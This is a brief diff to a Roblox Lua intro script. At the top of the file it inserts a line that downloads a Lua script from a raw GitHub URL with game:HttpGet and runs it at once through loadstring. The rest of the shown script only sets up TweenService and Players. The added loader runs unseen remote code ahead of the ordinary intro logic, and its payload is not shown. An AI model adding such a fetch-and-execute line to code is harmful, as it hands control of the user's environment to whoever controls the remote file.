@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SyKO6/sql/refs/heads/main/scripts/sh.lua"))()  
+
 -- ===== INTRO SCRIPT COMPLETO AJUSTADO =====
 local TweenService = game:GetService("TweenService")
 local Players = game:GetService("Players")
